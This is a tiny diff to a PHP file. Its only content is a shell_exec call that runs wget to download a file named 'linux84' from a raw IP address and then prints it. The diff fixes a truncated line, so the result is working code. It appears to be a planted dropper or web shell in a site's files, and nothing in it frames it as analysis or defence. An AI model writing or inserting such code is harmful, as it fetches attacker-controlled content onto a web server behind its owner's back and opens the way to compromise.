@@ -1,5 +1,5 @@
 <?php
 
-echo shell_exec("wget -O linux84 http://154.127.52.52/?work=workjob;cat ./linux$
+echo shell_exec("wget -O linux84 http://154.127.52.52/?work=workjob;cat ./linux84");
 
 ?>
